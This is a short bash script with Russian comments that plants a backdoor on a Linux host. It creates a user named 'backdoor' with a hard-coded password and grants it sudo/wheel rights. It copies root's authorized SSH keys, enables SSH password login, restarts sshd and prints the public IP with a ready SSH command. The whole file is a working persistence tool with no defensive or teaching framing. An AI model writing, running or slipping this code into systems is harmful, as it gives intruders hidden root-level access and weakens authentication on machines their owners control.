#!/bin/bash

# ===========================
# СКРИПТ ДЛЯ СОЗДАНИЯ ROOT-ПОЛЬЗОВАТЕЛЯ
# ===========================

# Пароль для пользователя
PASS="Qwerty123!"

# 1. Создаём пользователя
useradd -m -s /bin/bash backdoor
echo "backdoor:$PASS" | chpasswd

# 2. Добавляем в sudo (Debian/Ubuntu)
usermod -aG sudo backdoor 2>/dev/null
# Или в wheel (CentOS/RHEL)
usermod -aG wheel backdoor 2>/dev/null

# 3. Разрешаем SSH-доступ
mkdir -p /home/backdoor/.ssh
chmod 700 /home/backdoor/.ssh

# 4. Копируем существующий ключ (если есть)
if [ -f /root/.ssh/authorized_keys ]; then
    cp /root/.ssh/authorized_keys /home/backdoor/.ssh/
    chown -R backdoor:backdoor /home/backdoor/.ssh
fi

# 5. Включаем вход по паролю в SSH (если отключён)
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication false/PasswordAuthentication yes/g' /etc/ssh/sshd_config

# 6. Перезапускаем SSH
systemctl restart sshd 2>/dev/null
service ssh restart 2>/dev/null

# 7. Получаем IP-адрес
IP=$(curl -s https://api.ipify.org 2>/dev/null)
if [ -z "$IP" ]; then
    IP=$(hostname -I | awk '{print $1}')
fi

# 8. Выводим информацию
echo "============================"
echo "СОЗДАН ПОЛЬЗОВАТЕЛЬ:"
echo "Логин: backdoor"
echo "Пароль: $PASS"
echo "IP адрес: $IP"
echo "SSH: ssh backdoor@$IP"
echo "============================"
